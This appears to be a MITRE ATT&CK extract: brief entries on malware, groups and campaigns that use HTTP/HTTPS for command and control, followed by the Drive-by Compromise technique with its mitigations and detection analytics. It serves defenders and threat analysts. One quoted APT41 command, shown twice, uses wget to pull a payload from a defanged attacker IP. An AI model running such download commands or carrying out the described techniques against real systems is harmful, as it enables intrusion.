Software 'LockBit 3.0': LockBit 3.0 can use HTTP to send victim host information to C2. Software 'Raccoon Stealer': Raccoon Stealer uses HTTP, and particularly HTTP POST requests, for command and control actions. Software 'Valak': Valak has used HTTP in communications with C2. Software 'CloudDuke': One variant of CloudDuke uses HTTP and HTTPS for C2. Software 'GravityRAT': GravityRAT uses HTTP for C2. Software 'Havoc': Havoc can use HTTP/S listeners to establish and maintain C2 communications. Software 'DEATHRANSOM': DEATHRANSOM can use HTTPS to download files. Software 'Dridex': Dridex has used POST requests and HTTPS for C2 communications. Software 'AppleJeus': AppleJeus has sent data to its C2 server via POST requests. Software 'ANDROMEDA': ANDROMEDA has the ability to make GET requests to download files from C2. Software 'Neo-reGeorg': Neo-reGeorg can use customized HTTP headers. Software 'Exaramel for Linux': Exaramel for Linux uses HTTPS for C2 communications. Software '4H RAT': 4H RAT uses HTTP for command and control. Software 'HAMMERTOSS': The "Uploader" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands. Software 'HAWKBALL': HAWKBALL has used HTTP to communicate with a single hard-coded C2 server. Software 'Smoke Loader': Smoke Loader uses HTTP for C2. Software 'KOPILUWAK': KOPILUWAK has used HTTP POST requests to send data to C2. Software 'Uroburos': Uroburos can use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP. Software 'Felismus': Felismus uses HTTP for C2. Software 'BoomBox': BoomBox has used HTTP POST requests for C2. Software 'P.A.S. Webshell': P.A.S. Webshell can issue commands via HTTP POST. Software 'GreyEnergy': GreyEnergy uses HTTP and HTTPS for C2 communications. Software 'Aria-body': Aria-body has used HTTP in C2 communications. Software 'Helminth': Helminth can use HTTP for C2. Software 'JHUHUGIT': JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS. Software 'SoreFang': SoreFang can use HTTP in C2 communications. Software 'S-Type': S-Type uses HTTP for C2. Software 'HyperBro': HyperBro has used HTTPS for C2 communications. Software 'RGDoor': RGDoor uses HTTP for C2 communications. Software 'Emotet': Emotet has used HTTP for command and control. Software 'Pteranodon': Pteranodon can use HTTP for C2. Software 'ABK': ABK has the ability to use HTTP in communications with C2. Software 'FELIXROOT': FELIXROOT uses HTTP and HTTPS to communicate with the C2 server. Software 'BADHATCH': BADHATCH can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers. Software 'BACKSPACE': BACKSPACE uses HTTP as a transport to communicate with its command server. Software 'RATANKBA': RATANKBA uses HTTP/HTTPS for command and control communication. Software 'BBK': BBK has the ability to use HTTP in communications with C2. Software 'Psylo': Psylo uses HTTPS for C2. Software 'LightSpy': LightSpy's C2 communication is performed over WebSockets using the open source library SocketRocket with functionality such as, heartbeat, receiving commands, and updating command status. Software 'SVCReady': SVCReady can communicate with its C2 servers via HTTP. Software 'WindTail': WindTail has the ability to use HTTP for C2 communications. Software 'MechaFlounder': MechaFlounder has the ability to use HTTP in communication with C2. Software 'FoggyWeb': FoggyWeb has the ability to communicate with C2 servers over HTTP GET/POST requests. Software 'QakBot': QakBot has the ability to use HTTP and HTTPS in communication with C2 servers. Software 'Agent Tesla': Agent Tesla has used HTTP for C2 communications. Software 'Crimson': Crimson can use a HTTP GET request to download its final payload. Software 'MuddyViper': MuddyViper has used HTTP GET requests over port 443 and with the WINHTTP_FLAG_SECURE set to SSL/TLS via the WinHTTP API. Software 'Gazer': Gazer communicates with its C2 servers over HTTP. Software 'NETEAGLE': NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Software 'WhisperGate': WhisperGate can make an HTTPS connection to download additional files. Software 'UBoatRAT': UBoatRAT has used HTTP for C2 communications. Software 'STARWHALE': STARWHALE has the ability to contact actor-controlled C2 servers via HTTP. Software 'Raspberry Robin': Raspberry Robin uses outbound HTTP requests containing victim information for retrieving second stage payloads. Variants of Raspberry Robin can download archive files (such as 7-Zip files) via the victim web browser for second stage execution. Software 'Avenger': Avenger has the ability to use HTTP in communication with C2. Software 'AuTo Stealer': AuTo Stealer can use HTTP to communicate with its C2 servers. Software 'Remexi': Remexi uses BITSAdmin to communicate with the C2 server over HTTP. Software 'PlugX': PlugX can be configured to use HTTP for command and control. PlugX has also used HTTPS for C2. Software 'OSX_OCEANLOTUS.D': OSX_OCEANLOTUS.D can also use use HTTP POST and GET requests to send and receive C2 information. Software 'OopsIE': OopsIE uses HTTP for C2 communications. Software 'Zebrocy': Zebrocy uses HTTP for C2. Software 'PoetRAT': PoetRAT has used HTTP and HTTPs for C2 communications. Software 'SMOKEDHAM': SMOKEDHAM has communicated with its C2 servers via HTTPS and HTTP POST requests. Software 'StrongPity': StrongPity can use HTTP and HTTPS in C2 communications. Software 'Pandora': Pandora can communicate over HTTP. Software 'Kapeka': Kapeka utilizes HTTP for command and control. Software 'SpeakUp': SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C server. Software 'SnappyTCP': SnappyTCP connects to the command and control server via a TCP socket using HTTP. Software 'Milan': Milan can use HTTPS for communication with C2. Software 'Emissary': Emissary uses HTTP or HTTPS for C2. Software 'PHPsert': PHPsert can retrieve remote files using HTTP POST. Software 'Anchor': Anchor has used HTTP and HTTPS in C2 communications. Software 'MagicRAT': MagicRAT uses HTTP POST communication for command and control. Software 'ELMER': ELMER uses HTTP for command and control. Software 'Mafalda': Mafalda can use HTTP for C2. Software 'Latrodectus': Latrodectus can send registration information to C2 via HTTP `POST`. Software 'LookBack': LookBack’s C2 proxy tool sends data to a C2 server over HTTP. Software 'YAHOYAH': YAHOYAH uses HTTP for C2. Software 'Squirrelwaffle': Squirrelwaffle has used HTTP POST requests for C2 communications. Software 'Reaver': Some Reaver variants use HTTP for C2. Software 'DanBot': DanBot can use HTTP in C2 communication. Software 'Rising Sun': Rising Sun has used HTTP and HTTPS for command and control. Software 'NGLite': NGLite will initially beacon out to the NKN network via an HTTP POST over TCP 30003. Software 'RCSession': RCSession can use HTTP in C2 communications. Software 'Comnie': Comnie uses HTTP for C2 communication. Software 'Shai-Hulud': Shai-Hulud has utilized curl to install Bun over HTTPS. Software 'BBSRAT': BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server. Software 'ShimRat': ShimRat communicated over HTTP and HTTPS with C2 servers. Software 'Dyre': Dyre uses HTTPS for C2 communications. Software 'Stuxnet': Stuxnet uses HTTP to communicate with a command and control server. Software 'LunarWeb': LunarWeb can use `POST` to send victim identification to C2 and `GET` to retrieve commands. Software 'Cuckoo Stealer': Cuckoo Stealer can use the curl API for C2 communications. Software 'Dipsind': Dipsind uses HTTP for C2. Software 'Flagpro': Flagpro can communicate with its C2 using HTTP. Software 'reGeorg': reGeorg can use HTTP to tunnel connections in and out of targeted networks. Software 'SampleCheck5000': SampleCheck5000 can use the Exchange Web Services API for C2 communication. Software 'Line Runner': Line Runner utilizes an HTTP-based Lua backdoor on victim machines. Software 'SLIGHTPULSE': SLIGHTPULSE has the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests. Software 'Machete': Machete uses HTTP for Command & Control. Software 'Torisma': Torisma can use HTTP and HTTPS for C2 communications. Software 'Bisonal': Bisonal has used HTTP for C2 communications. Software 'Gomir': Gomir periodically communicates to its command and control infrastructure through HTTP POST requests. Software 'SideTwist': SideTwist has used HTTP GET and POST requests over port 443 for C2. Software 'Goopy': Goopy has the ability to communicate with its C2 over HTTP. Software 'Hikit': Hikit has used HTTP for C2. Software 'Final1stspy': Final1stspy uses HTTP for C2. Software 'GoldenSpy': GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication. Software 'Line Dancer': Line Dancer uses HTTP POST requests to interact with compromised devices. Software 'TrailBlazer': TrailBlazer has used HTTP requests for C2. Software 'Kevin': Variants of Kevin can communicate with C2 over HTTP. Software 'CharmPower': CharmPower can use HTTP to communicate with C2. Software 'HTTPTroy': HTTPTroy has used HTTP POST requests to communicate with C2. Software 'DarkWatchman': DarkWatchman uses HTTPS for command and control. Software 'Ursnif': Ursnif has used HTTPS for C2. Software 'Mango': Mango can retrieve C2 commands sent in HTTP responses. Software 'ADVSTORESHELL': ADVSTORESHELL connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs. Software 'FlawedAmmyy': FlawedAmmyy has used HTTP for C2. Software 'Mis-Type': Mis-Type network traffic can communicate over HTTP. Software 'Doki': Doki has communicated with C2 over HTTPS. Software 'Maze': Maze has communicated to hard-coded IP addresses via HTTP. Software 'metaMain': metaMain can use HTTP for C2 communications. Software 'LitePower': LitePower can use HTTP and HTTPS for C2 communications. Software 'WinMM': WinMM uses HTTP for C2. Software 'Woody RAT': Woody RAT can communicate with its C2 server using HTTP requests. Software 'SeaDuke': SeaDuke uses HTTP and HTTPS for C2. Software 'njRAT': njRAT has used HTTP for C2 communications. Software 'Micropsia': Micropsia uses HTTP and HTTPS for C2 network communications. Software 'KGH_SPY': KGH_SPY can send data to C2 with HTTP POST requests. Software 'PolyglotDuke': PolyglotDuke has has used HTTP GET requests in C2 communications. Software 'Cobalt Strike': Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports. Software 'PowerShower': PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions. Software 'httpclient': httpclient uses HTTP for command and control. Software 'ZeroT': ZeroT has used HTTP for C2. Software 'Pony': Pony has sent collected information to the C2 via HTTP POST request. Software 'IPsec Helper': IPsec Helper connects to command and control servers via HTTP POST requests based on parameters hard-coded into the malware. Software 'PowGoop': PowGoop can send HTTP GET requests to malicious servers. Software 'Industroyer': Industroyer’s main backdoor connected to a remote C2 server using HTTPS. Software 'CosmicDuke': CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers. Software 'Carbon': Carbon can use HTTP in C2 communications. Software 'Explosive': Explosive has used HTTP for communication. Software 'TONESHELL': TONESHELL has utilized HTTP for a C2 protocol through HTTP POST. TONESHELL has also utilized HTTPS for C2. Software 'COATHANGER': COATHANGER uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control. Software 'Kazuar': Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API. Software 'PUNCHBUGGY': PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests. Software 'HTTPBrowser': HTTPBrowser has used HTTP and HTTPS for command and control. Software 'RedLine Stealer': RedLine Stealer has utilized HTTP for C2 communications. RedLine Stealer has also conducted C2 communications to hardcoded C2 servers over HTTPS. RedLine Stealer has leveraged SOAP protocol for C2 communications. Software 'RTM': RTM has initiated connections to external domains using HTTPS. Software 'Zeus Panda': Zeus Panda uses HTTP for C2 communications. Software 'GoldMax': GoldMax has used HTTPS and HTTP GET requests with custom HTTP cookies for C2. Software 'OnionDuke': OnionDuke uses HTTP and HTTPS for C2. Software 'DarkComet': DarkComet can use HTTP for C2 communications. Software 'Octopus': Octopus has used HTTP GET and POST requests for C2 communications. Software 'GeminiDuke': GeminiDuke uses HTTP and HTTPS for command and control. Software 'GuLoader': GuLoader can use HTTP to retrieve additional binaries. Software 'Chaes': Chaes has used HTTP for C2 communications. Software 'Turian': Turian has the ability to use HTTP for its C2. Software 'DRATzarus': DRATzarus can use HTTP or HTTPS for C2 communications. Software 'IcedID': IcedID has used HTTPS in communications with C2. Software 'REvil': REvil has used HTTP and HTTPS in communication with C2. Software 'XLoader': XLoader uses HTTP and HTTPS for command and control communication. Software 'HexEval Loader': HexEval Loader has used HTTP and HTTPS POST requests to communicate with C2. Software 'Elise': Elise communicates over HTTP or HTTPS for C2. Software 'down_new': down_new has the ability to use HTTP in C2 communications. Software 'BLUELIGHT': BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API. Software 'BOLDMOVE': BOLDMOVE uses web services for command and control communication. Software 'QUIETCANARY': QUIETCANARY can use HTTPS for C2 communications. Software 'Egregor': Egregor has communicated with its C2 servers via HTTPS protocol. Software 'VBShower': VBShower has attempted to obtain a VBS script from command and control (C2) nodes over HTTP. Software 'IceApple': IceApple can use HTTP GET to request and pull information from C2. Software 'Shark': Shark has the ability to use HTTP in C2 communications. Software 'AppleSeed': AppleSeed has the ability to communicate with C2 over HTTP. Software 'Gold Dragon': Gold Dragon uses HTTP for communication to the control servers. Software 'Bazar': Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications. Software 'BackConfig': BackConfig has the ability to use HTTPS for C2 communiations. Software 'RedLeaves': RedLeaves can communicate to its C2 over HTTP and HTTPS if directed. Software 'OilBooster': OilBooster can send HTTP `GET`, `POST`, `PUT`, and `DELETE` requests to the Microsoft Graph API over port 443 for C2 communication. Software 'Carberp': Carberp has connected to C2 servers via HTTP. Software 'Clambling': Clambling has the ability to communicate over HTTP. Software 'RIPTIDE': APT12 has used RIPTIDE, a RAT that uses HTTP to communicate. Software 'NOKKI': NOKKI has used HTTP for C2 communications. Software 'Manjusaka': Manjusaka has used HTTP for command and control communication. Software 'ShadowPad': ShadowPad communicates over HTTP to retrieve a string that is decoded into a C2 server URL. Software 'Sys10': Sys10 uses HTTP for C2. Software 'MarkiRAT': MarkiRAT can initiate communication over HTTP/HTTPS for its C2 server. Software 'OLDBAIT': OLDBAIT can use HTTP for C2. Software 'Komplex': The Komplex C2 channel uses HTTP POST requests. Software 'Gelsemium': Gelsemium can use HTTP/S in C2 communications. Software 'XORIndex Loader': XORIndex Loader has used HTTPS POST to communicate with C2. Software 'PUBLOAD': PUBLOAD has communicated via `curl` over HTTP to identify device IP data. PUBLOAD has also utilized HTTP for a command-and-control protocol through HTTP POST. PUBLOAD has also leveraged HTTPS for C2. Software 'RIFLESPINE': RIFLESPINE can use HTTP `GET` and `PUT` to upload and download files. Software 'SUGARDUMP': A SUGARDUMP variant has used HTTP for C2. Software 'InvisibleFerret': InvisibleFerret has used HTTP for C2 communications. Software 'Cardinal RAT': Cardinal RAT is downloaded using HTTP over port 443. Software 'OwaAuth': OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions. Software 'OutSteel': OutSteel has used HTTP for C2 communications. Software 'Daserf': Daserf uses HTTP for C2. Software 'NETWIRE': NETWIRE has the ability to communicate over HTTP. Software 'Ninja': Ninja can use HTTP for C2 communications. Software 'DownPaper': DownPaper communicates to its C2 server over HTTP. Software 'Remsec': Remsec is capable of using HTTP and HTTPS for C2. Software 'MiniDuke': MiniDuke uses HTTP and HTTPS for command and control. Software 'Get2': Get2 has the ability to use HTTP to send information collected from an infected host to C2. Software 'Winnti for Windows': Winnti for Windows has the ability to use encapsulated HTTP/S in C2 communications. Software 'WIREFIRE': WIREFIRE can respond to specific HTTP `POST` requests to `/api/v1/cav/client/visits`. Software 'STEADYPULSE': STEADYPULSE can parse web requests made to a targeted server to determine the next stage of execution. Software 'Samurai': Samurai can use a .NET HTTPListener class to receive and handle HTTP POST requests. Software 'Lokibot': Lokibot has used HTTP for C2 communications. Software 'Small Sieve': Small Sieve can contact actor-controlled C2 servers by using the Telegram API over HTTPS. Software 'InvisiMole': InvisiMole uses HTTP for C2 communications. Software 'Grandoreiro': Grandoreiro has the ability to use HTTP in C2 communications. Software 'GoldFinder': GoldFinder has used HTTP for C2. Software 'Neoichor': Neoichor can use HTTP for C2 communications. Software 'Lumma Stealer': Lumma Stealer has used HTTP and HTTP for command and control communication. Software 'Cyclops Blink': Cyclops Blink can download files via HTTP and HTTPS. Software 'Amadey': Amadey has used HTTP for C2 communications. Software 'TinyTurla': TinyTurla can use HTTPS in C2 communications. Software 'TrickBot': TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files. Software 'Trojan.Karagany': Trojan.Karagany can communicate with C2 via HTTP POST requests. Software 'StealBit': StealBit can use HTTP to exfiltrate files to actor-controlled infrastructure. Software 'VaporRage': VaporRage can use HTTP to download shellcode from compromised websites. Software 'SUNBURST': SUNBURST communicated via HTTP GET or HTTP POST requests to third party servers for C2. Software 'GrimAgent': GrimAgent has the ability to use HTTP for C2 communications. Software 'Shamoon': Shamoon has used HTTP for C2. Software 'WellMess': WellMess can use HTTP and HTTPS in C2 communications. Software 'DealersChoice': DealersChoice uses HTTP for communication with the C2 server. Software 'Spark': Spark has used HTTP POST requests to communicate with its C2 server to receive commands. Software 'ROKRAT': ROKRAT can use HTTP and HTTPS for command and control communication. Software 'BlackEnergy': BlackEnergy communicates with its C2 server over HTTP. Software 'TAMECAT': TAMECAT has used HTTP for C2 communications. Software 'ShrinkLocker': ShrinkLocker uses HTTP POST requests to communicate victim information back to the threat actor. Software 'ZLib': ZLib communicates over HTTP for C2. Software 'Bundlore': Bundlore uses HTTP requests for C2. Software 'Sibot': Sibot communicated with its C2 server via HTTP GET requests. Software 'NICECURL': NICECURL has used HTTPS for C2 communications. Software 'DarkTortilla': DarkTortilla has used HTTP and HTTPS for C2. Group 'Rancor': Rancor has used HTTP for C2. Group 'Metador': Metador has used HTTP for C2. Group 'RedEcho': RedEcho network activity is associated with SSL traffic via TCP 443 and proxied HTTP traffic over non-standard ports. Group 'BITTER': BITTER has used HTTP POST requests for C2. Group 'Moonstone Sleet': Moonstone Sleet used curl to connect to adversary-controlled infrastructure and retrieve additional payloads. Group 'OilRig': OilRig has used HTTP for C2.During Juicy Mix, OilRig used a VBS script to send POST requests to register installed malware with C2.During Outer Space, OilRig used HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API. Group 'Orangeworm': Orangeworm has used HTTP for C2. Group 'APT37': APT37 uses HTTPS to conceal C2 communications. Group 'Winter Vivern': Winter Vivern uses HTTP and HTTPS protocols for exfiltration and command and control activity. Group 'Dark Caracal': Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”. Group 'Daggerfly': Daggerfly uses HTTP for command and control communication. Group 'Magic Hound': Magic Hound has used HTTP for C2. Group 'Tropic Trooper': Tropic Trooper has used HTTP in communication with the C2. Group 'Chimera': Chimera has used HTTPS for C2 communications. Group 'LuminousMoth': LuminousMoth has used HTTP for C2. Group 'APT19': APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2. Group 'APT41': APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. During C0017, APT41 ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads. APT41 DUST was conducted by APT41 from 2023 to July 2024.APT41 DUST used HTTPS for command and control. Group 'Mustang Panda': Mustang Panda has communicated with its C2 via HTTP POST requests.RedDelta Modified PlugX Infection Chain Operations was an campaign linked to Mustang Panda operations.Mustang Panda used HTTP POST messages for command and control from PlugX installations during RedDelta Modified PlugX Infection Chain Operations. Group 'Medusa Group': Medusa Group has communicated through reverse or bind shells over port 443 (HTTPS). Group 'APT38': APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS. Group 'BRONZE BUTLER': BRONZE BUTLER malware has used HTTP for C2. Group 'Sidewinder': Sidewinder has used HTTP in C2 communications. Group 'Kimsuky': Kimsuky has used HTTP GET and POST requests for C2. Group 'Lazarus Group': Lazarus Group has conducted C2 over HTTP and HTTPS.During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers. Group 'BlackByte': BlackByte collected victim device information then transmitted this via HTTP POST to command and control infrastructure. Group 'Higaisa': Higaisa used HTTP and HTTPS to send data back to its C2 server. Group 'RedCurl': RedCurl has used HTTP, HTTPS and Webdav protocls for C2 communications. Group 'MuddyWater': MuddyWater has used HTTP for C2 communications. Group 'Stealth Falcon': Stealth Falcon malware communicates with its C2 server via HTTPS. Group 'APT32': APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP. Group 'Inception': Inception has used HTTP, HTTPS, and WebDav in network communications. Group 'WIRTE': WIRTE has used HTTP for network communication. Group 'Turla': Turla has used HTTP and HTTPS for C2 communications. Group 'FIN13': FIN13 has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data. Group 'SilverTerrier': SilverTerrier uses HTTP for C2 communications. Group 'APT28': Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration. Group 'Wizard Spider': Wizard Spider has used HTTP for network communications. Group 'FIN8': FIN8 has used HTTPS for command and control. Group 'Confucius': Confucius has used HTTP for C2 communications. Group 'Windshift': Windshift has used tools that communicate with C2 over HTTP. Group 'Cobalt Group': Cobalt Group has used HTTPS for C2. Group 'APT33': APT33 has used HTTP for command and control. Group 'TA551': TA551 has used HTTP for C2 communications. Group 'APT42': APT42 has used tools such as NICECURL with command and control communication taking place over HTTPS. Group 'Gamaredon Group': Gamaredon Group has used HTTP and HTTPS for C2 communications. Group 'Ke3chang': Ke3chang malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2. Group 'FIN4': FIN4 has used HTTP POST requests to transmit data. Group 'APT18': APT18 uses HTTP for C2 communications. Group 'APT39': APT39 has used HTTP in communications with C2. Group 'Threat Group-3390': Threat Group-3390 malware has used HTTP for C2. Group 'HAFNIUM': HAFNIUM has used open-source C2 frameworks, including Covenant. Group 'VOID MANTICORE': VOID MANTICORE has utilized HTTPS for communication to C2 domains. Group 'TeamTNT': TeamTNT has the `curl` command to send credentials over HTTP and the `curl` and `wget` commands to download new software. TeamTNT has also used a custom user agent HTTP header in shell scripts. Group 'Rocke': Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol. Group 'Sea Turtle': Sea Turtle connected over TCP using HTTP to establish command and control channels. Group 'Sandworm Team': Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP. During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. Group 'TA505': TA505 has used HTTP to communicate with C2 nodes. Group 'Volt Typhoon': Versa Director Zero Day Exploitation was conducted by Volt Typhoon between June and August 2024.Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers. Group 'AppleJeus': During the 3CX Supply Chain Attack, AppleJeus's COLDCAT C2 leverages cookie headers to contain data over HTTPS. Cookies also contain hardcoded variables `__tutma` or `__tutmc` in the payload's HTTPS request. Group 'APT29': During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration. Campaign 'RedDelta Modified PlugX Infection Chain Operations': Mustang Panda used HTTP POST messages for command and control from PlugX installations during RedDelta Modified PlugX Infection Chain Operations. Campaign 'SharePoint ToolShell Exploitation': During SharePoint ToolShell Exploitation, threat actors issued HTTP `POST` requests to web shells with spoofed or empty Referrer headers, to circumvent authorization controls. Campaign 'Operation MidnightEclipse': During Operation MidnightEclipse, threat actors used `wget` via HTTP to retrieve payloads. Campaign 'Operation Wocao': During Operation Wocao, threat actors’ XServer tool communicated using HTTP and HTTPS. Campaign 'Quad7 Activity': Quad7 Activity has used the same User Agents of Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko and Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 combined with a reference to the Microsoft Azure PowerShell Application ID 1950a258-227b-4e31-a9cf-717495945fc2 in their sign-in attempts. Campaign 'Frankenstein': During Frankenstein, the threat actors used HTTP GET requests for C2. Campaign 'C0017': During C0017, APT41 ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads. Campaign 'Juicy Mix': During Juicy Mix, OilRig used a VBS script to send POST requests to register installed malware with C2. Campaign 'Indian Critical Infrastructure Intrusions': During Indian Critical Infrastructure Intrusions, RedEcho network activity included SSL traffic over TCP 443 and HTTP traffic over non-standard ports. Campaign 'Night Dragon': During Night Dragon, threat actors used HTTP for C2. Campaign 'Outer Space': During Outer Space, OilRig used HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API. Campaign 'C0021': During C0021, the threat actors used HTTP for some of their C2 communications. Campaign 'Versa Director Zero Day Exploitation': Versa Director Zero Day Exploitation established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers. Campaign '2015 Ukraine Electric Power Attack': During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. Campaign 'Operation CuckooBees': During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners. Campaign 'Operation Dream Job': During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers. Campaign 'C0018': During C0018, the threat actors used HTTP for C2 communications. Campaign '3CX Supply Chain Attack': During the 3CX Supply Chain Attack, AppleJeus's COLDCAT C2 leverages cookie headers to contain data over HTTPS. Cookies also contain hardcoded variables `__tutma` or `__tutmc` in the payload's HTTPS request. Campaign 'APT41 DUST': APT41 DUST used HTTPS for command and control. Campaign 'ArcaneDoor': ArcaneDoor command and control activity was conducted through HTTP. Campaign 'SolarWinds Compromise': During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration.

T1189.name: Drive-by Compromise
T1189.description:
Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:

* A legitimate website is compromised, allowing adversaries to inject malicious code
* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary
* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))
* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)

Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking "allow" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)

Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)

Typical drive-by compromise process:

1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.

Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.
T1189.mitigations:
Mitigation 'Exploit Protection': Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility.
Mitigation 'Update Software': Ensuring that all browsers and plugins are kept updated can help prevent the exploit phase of this technique. Use modern browsers with security features turned on.
Mitigation 'Application Isolation and Sandboxing': Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist. Other types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist for these types of systems.
Mitigation 'Restrict Web-Based Content': Adblockers can help prevent malicious code served through ads from executing in the first place. Script blocking extensions can also help to prevent the execution of JavaScript. Consider disabling browser push notifications from certain applications and browsers.
Mitigation 'User Training': Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.
T1189.detections:
Detection Strategy: Drive-by Compromise — Behavior-based, Multi-platform Detection Strategy (T1189)
- Analytic 'Analytic 0498': Correlated evidence of anomalous browser/network behavior (suspicious external resource fetches and script injection patterns) followed by atypical child processes, ephemeral execution contexts, memory modification or process injection, and unexpected file drops. Defender sees network requests to previously unseen/suspicious domains or resources + browser process spawning unusual children or loading unsigned modules + file writes or registry changes shortly after those requests.
- Analytic 'Analytic 0499': Correlated evidence of browser or webview fetches to uncommon domains or mutated JS resources (proxy/NGFW logs + Zeek/HTTP logs) followed by unexpected interpreters or script engines executing (python, ruby, sh) spawned from browser processes or user sessions, rapid on-disk staging in /tmp, and outbound connections that deviate from baseline. Defender sees: uncommon resource fetch → short-lived child process executions from user browser context → file writes in temp directories → anomalous outbound C2-like connections.
- Analytic 'Analytic 0500': Correlated evidence where Safari/Chrome/WebKit-based processes issue network requests for uncommon or obfuscated JS resources followed by spawning of script interpreters, launchd or ad-hoc binaries, unusual child processes, or dynamic library loads into browser processes. Defender sees: proxy/HTTP logs with suspicious resource content + unifiedlogs/ASL showing browser/plugin crashes or extension loads + process events indicating child process creation and file writes to /var/folders or /tmp shortly after the fetch.
- Analytic 'Analytic 0501': Post-compromise identity & session anomalies that follow a drive-by compromise: token reuse from new/unfamiliar IPs, anomalous sign-in patterns for previously inactive users, unexpected consent/grant events, or provisioning changes. Defender sees an endpoint/browser compromise (network + endpoint signals) followed by unusual IdP events: new refresh token issuance, consent/consent-grant events, odd MFA bypass patterns, or unusual OAuth client registrations.
